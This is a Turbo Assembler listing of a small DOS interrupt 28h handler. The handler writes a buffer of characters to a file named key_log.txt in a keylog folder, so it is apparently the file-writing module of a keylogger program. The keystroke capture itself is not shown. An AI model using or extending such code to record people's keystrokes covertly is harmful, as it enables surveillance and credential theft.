Turbo Assembler	 Version 4.1	    03/03/20 15:40:45	    Page 1
print.asm



      1
      2				     locals @@
      3
      4				     .186
      5	0000			     .model tiny
      6
      7	0000			     .code
      8
      9				     public Printer
     10
     11				     public AsciiBuffer
     12				     public BufEnd
     13
     14				     ;==========================================================================
     15				     ; 28th interrupt handler
     16				     ; prints all symbols from the buffer when it's safe
     17				     ;==========================================================================
     18
     19	0000			     Printer	     proc
     20
     21	0000  50 53 51 52 1E			     push    ax	bx cx dx ds
     22
     23	0005  33 C9				     xor     cx, cx
     24
     25	0007  2E: 8A 0E	0050r			     mov     cl, cs:BufEnd
     26	000C  2E: 3A 0E	004Fr			     cmp     cl, cs:BufStart
     27	0011  74 36				     je	     @@exit
     28
     29	0013  B8 3D01				     mov     ax, 3d01h
     30	0016  BA 0151r				     mov     dx, offset	FileSpec
     31	0019  0E				     push    cs
     32	001A  1F				     pop     ds
     33	001B  CD 21				     int     21h
     34
     35	001D  8B D8				     mov     bx, ax
     36
     37	001F  51				     push    cx
     38	0020  B8 4202				     mov     ax, 4202h
     39	0023  33 C9				     xor     cx, cx
     40	0025  33 D2				     xor     dx, dx
     41
     42	0027  CD 21				     int     21h
     43	0029  59				     pop     cx
     44
     45	002A  51				     push    cx
     46	002B  2E: 2A 0E	004Fr			     sub     cl, cs:BufStart
     47	0030  BA 0051r				     mov     dx, offset	AsciiBuffer
     48	0033  33 C0				     xor     ax, ax
     49	0035  2E: A0 004Fr			     mov     al, cs:BufStart
     50	0039  03 D0				     add     dx, ax
     51	003B  B4 40				     mov     ah, 40h
     52
     53	003D  CD 21				     int     21h
     54	003F  59				     pop     cx
     55
     56	0040  2E: 88 0E	004Fr			     mov     cs:BufStart, cl
     57
Turbo Assembler	 Version 4.1	    03/03/20 15:40:45	    Page 2
print.asm



     58	0045  B4 3E				     mov     ah, 3eh
     59
     60	0047  CD 21				     int     21h
     61
     62	0049  1F 5A 59 5B 58	     @@exit:	     pop     ds	dx cx bx ax
     63
     64	004E  CF				     iret
     65	004F					     endp
     66
     67				     ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     68
     69	004F  01		     BufStart	     db	1
     70	0050  02		     BufEnd	     db	2
     71	0051  0100*(00)		     AsciiBuffer     db	256 dup(0)
     72
     73	0151  77 3A 5C 6B 65 79	6C+  FileSpec	     db	"w:\keylog\log\key_log.txt", 0
     74	      6F 67 5C 6C 6F 67	5C+
     75	      6B 65 79 5F 6C 6F	67+
     76	      2E 74 78 74 00
     77
     78				     ;==========================================================================
     79
     80				     end
Turbo Assembler	 Version 4.1	    03/03/20 15:40:45	    Page 3
Symbol Table




Symbol Name			  Type	 Value

??DATE				  Text	 "03/03/20"
??FILENAME			  Text	 "print	  "
??TIME				  Text	 "15:40:45"
??VERSION			  Number 040A
@32BIT				  Text	 0
@@EXIT				  Near	 DGROUP:0049
@CODE				  Text	 DGROUP
@CODESIZE			  Text	 0
@CPU				  Text	 0103H
@CURSEG				  Text	 _TEXT
@DATA				  Text	 DGROUP
@DATASIZE			  Text	 0
@FILENAME			  Text	 PRINT
@INTERFACE			  Text	 000H
@MODEL				  Text	 1
@STACK				  Text	 DGROUP
@WORDSIZE			  Text	 2
ASCIIBUFFER			  Byte	 DGROUP:0051
BUFEND				  Byte	 DGROUP:0050
BUFSTART			  Byte	 DGROUP:004F
FILESPEC			  Byte	 DGROUP:0151
PRINTER				  Near	 DGROUP:0000

Groups & Segments		  Bit Size Align  Combine Class

DGROUP				  Group
  _DATA				  16  0000 Word	  Public  DATA
  _TEXT				  16  016B Word	  Public  CODE
